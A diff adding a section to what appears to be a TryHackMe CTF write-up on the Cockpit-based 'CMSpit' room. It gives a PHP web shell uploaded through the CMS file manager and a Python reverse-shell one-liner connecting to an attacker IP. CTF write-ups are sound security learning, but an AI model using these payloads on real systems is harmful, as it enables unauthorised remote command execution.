@@ -78,3 +78,36 @@ Dashboard
 
 ## Time to Reverse shell
 
+Go to finder
+
+![image](../assets/img/thm/cmspit/finder.png)
+
+and click create ..file
+
+![image](../assets/img/thm/cmspit/create.png)
+
+create a file shellme.php
+
+![image](../assets/img/thm/cmspit/shellme.png)
+
+and edit the file enter php payload
+
+```php
+<?php
+        echo shell_exec($_REQUEST['cmd']);
+?>
+```
+![image](../assets/img/thm/cmspit/write shell.png)
+
+save it and open it
+
+![image](../assets/img/thm/cmspit/id.png)
+
+yeah! we did lets get reverse shell with python3 payload
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.xx.xxx",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+![image](../assets/img/thm/cmspit/reversesheel.png)
+
